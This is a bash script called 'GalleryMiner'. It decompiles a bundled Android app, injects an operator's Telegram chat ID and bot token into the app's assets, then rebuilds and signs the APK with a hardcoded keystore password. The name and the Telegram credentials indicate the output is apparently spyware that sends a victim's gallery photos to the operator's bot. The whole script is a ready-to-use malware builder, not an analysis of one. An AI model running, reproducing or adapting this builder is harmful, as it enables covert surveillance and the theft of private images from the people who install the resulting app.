#!/bin/env bash

# Set paths to tools and key store
APKTOOL_PATH="apktool"  # Path to apktool executable
JARSIGNER_PATH="jarsigner"  # Path to jarsigner executable

KEYSTORE_PATH="key.keystore"
KEY_ALIAS="keystore"
KEYSTORE_PASSWORD="mkdirlove"
KEY_ALIAS_PASSWORD="mkdirlove"

# Define paths
APK_FILE="base.apk"
DECOMPILED_DIR="decompiled_apk"
RECOMPILED_APK_FILE="recompiled_app.apk"
SIGNED_APK_FILE="GalleryMiner.apk"

function banner {
    clear
    toilet -f small "GalleryMiner"
    echo "  Made with <3 by @mkdirlove             v1.0-dev"    
    echo 
    echo "Using tools:"
    echo "  APKTool: $APKTOOL_PATH"
    echo "  Jarsigner: $JARSIGNER_PATH"
    echo
}

function run_command {
    local command="$1"
    echo "Running: $command"
    eval "$command"
    if [ $? -ne 0 ]; then
        echo "Error running command: $command" >&2
        exit 1
    fi
}

function check_and_install_tools {
    # Check and install apktool
    if ! command -v apktool &> /dev/null; then
        echo "apktool not found. Installing..."
        if [ "$(uname)" == "Darwin" ]; then
            # macOS
            brew install apktool
        else
            # Assume Ubuntu/Debian
            sudo apt-get update
            sudo apt-get install -y apktool
        fi
    fi

    # Check and install jarsigner
    if ! command -v jarsigner &> /dev/null; then
        echo "jarsigner not found. Installing..."
        if [ "$(uname)" == "Darwin" ]; then
            # macOS
            brew install openjdk
        else
            # Assume Ubuntu/Debian
            sudo apt-get update
            sudo apt-get install -y openjdk-11-jdk
        fi
    fi

    # Check and install toilet
    if ! command -v toilet &> /dev/null; then
        echo "toilet not found. Installing..."
        if [ "$(uname)" == "Darwin" ]; then
            # macOS
            brew install toilet
        else
            # Assume Ubuntu/Debian
            sudo apt-get update
            sudo apt-get install -y toilet
        fi
    fi
}

function decompile_apk {
    local apk_file="$1"
    local output_dir="$2"
    local command="$APKTOOL_PATH d $apk_file -o $output_dir"
    run_command "$command"
    echo "Decompiled $apk_file to $output_dir"
}

function add_files_to_assets {
    local decompiled_dir="$1"
    local id_content="$2"
    local token_content="$3"
    local assets_dir="$decompiled_dir/assets"
    mkdir -p "$assets_dir"

    echo "$id_content" > "$assets_dir/id.txt"
    echo "Added id.txt to $assets_dir"

    echo "$token_content" > "$assets_dir/token.txt"
    echo "Added token.txt to $assets_dir"
}

function recompile_apk {
    local input_dir="$1"
    local output_apk="$2"
    local command="$APKTOOL_PATH b $input_dir -o $output_apk"
    run_command "$command"
    echo "Recompiled APK to $output_apk"
}

function sign_apk {
    local apk_file="$1"
    local signed_apk_file="$2"
    local command="$JARSIGNER_PATH -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $KEYSTORE_PATH -storepass $KEYSTORE_PASSWORD -keypass $KEY_ALIAS_PASSWORD $apk_file $KEY_ALIAS"
    run_command "$command"
    cp "$apk_file" "$signed_apk_file"
    echo "Signed APK saved as: $signed_apk_file"
}

function parse_args {
    while [[ "$#" -gt 0 ]]; do
        case $1 in
            --tg_id) id_content="$2"; shift ;;
            --tg_bot_token) token_content="$2"; shift ;;
            --sign) sign_option="$2"; shift ;;
            *) echo "Unknown parameter passed: $1"; exit 1 ;;
        esac
        shift
    done

    if [ -z "$id_content" ] || [ -z "$token_content" ] || [ -z "$sign_option" ]; then
        echo "Usage: $0 --tg_id <id_content> --tg_bot_token <bot_token> --sign <sign_option>"
        exit 1
    fi
}

function main {
    check_and_install_tools
    banner

    parse_args "$@"

    # Decompile APK
    decompile_apk "$APK_FILE" "$DECOMPILED_DIR"

    # Add text files to assets
    add_files_to_assets "$DECOMPILED_DIR" "$id_content" "$token_content"

    # Recompile APK
    recompile_apk "$DECOMPILED_DIR" "$RECOMPILED_APK_FILE"

    # Ask user if they want to sign the APK
    banner
    if [ "$sign_option" == "yes" ]; then
        sign_apk "$RECOMPILED_APK_FILE" "$SIGNED_APK_FILE"
        rm -rf "$RECOMPILED_APK_FILE" "$DECOMPILED_DIR"
        banner
        echo "Process completed. Signed APK: $SIGNED_APK_FILE"
    else
        echo "Process completed. Recompiled APK: $RECOMPILED_APK_FILE"
    fi
}

# Call the main function with arguments
main "$@"
